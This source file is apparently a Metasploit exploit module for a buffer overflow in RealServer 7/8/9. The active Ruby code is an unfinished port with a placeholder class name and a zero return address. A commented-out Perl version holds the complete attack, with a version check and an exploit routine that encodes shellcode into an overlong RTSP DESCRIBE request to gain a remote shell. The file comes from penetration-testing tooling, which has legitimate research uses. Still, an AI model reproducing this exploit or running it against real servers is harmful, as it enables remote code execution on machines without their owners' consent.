require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'RealServer Describe Buffer Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in RealServer 7/8/9
				and was based on Johnny Cyberpunk's THCrealbad exploit. This
				code should reliably exploit Linux, BSD, and Windows-based
				servers.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '4468'],
					[ 'URL', 'http://lists.immunitysec.com/pipermail/dailydave/2003-August/000030.html'],
					[ 'MIL', '51'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => "\x00\x0a\x0d\x25\x2e\x2f\x5c\xff\x20\x3a\x26\x3f\x2e\x3d",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux, bsd, win32',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Dec 20 2002',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::realserver_describe_linux;
use base 'Msf::Exploit';
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'RealServer Describe Buffer Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'linux', 'bsd', 'win32' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The RTSP port', 554],
	  },

	'Payload' =>
	  {
		'Space'      => 2000,
		'BadChars'  => "\x00\x0a\x0d\x25\x2e\x2f\x5c\xff :&?.=",
		'Keys'      => ['+findsock'],

	  },

	'Description'  => Pex::Text::Freeform(qq{
        This module exploits a buffer overflow in RealServer 7/8/9 and was based
        on Johnny Cyberpunk's THCrealbad exploit. This code should reliably exploit
        Linux, BSD, and Windows-based servers.
}),

	'Refs'  =>
	  [
		['OSVDB',   '4468'],
		['URL',     'http://lists.immunitysec.com/pipermail/dailydave/2003-August/000030.html'],
		['MIL',     '51'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [['Universal Target']],

	'Keys'  => ['realserver'],

	'DisclosureDate' => 'Dec 20 2002',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("OPTIONS / RTSP/1.0\r\n\r\n");

	my $res = $s->Recv(-1, 5);
	$s->Close();

	if ($res =~ m/^Server:([^\n]+)/sm)
	{
		my $svr = $1;
		$svr =~ s/(^\s+|\r|\s+$)//g;
		$self->PrintLine("[*] $svr");
		return $self->CheckCode('Detected');
	}
	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	$self->PrintLine("[*] RealServer universal exploit launched against $target_host");
	$self->PrintLine("[*] Kill the master rmserver pid to prevent shell disconnect");

	my $encoded;
	foreach (split(//, $shellcode)){ $encoded .= sprintf("%%%.2x", ord($_)) }

	my $req = "DESCRIBE /". ("../" x 560)  . "\xcc\xcc\x90\x90". $encoded. ".smi RTSP/1.0\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($req);

	$self->Handler($s);

	return;
}

1;

=end


end
end	
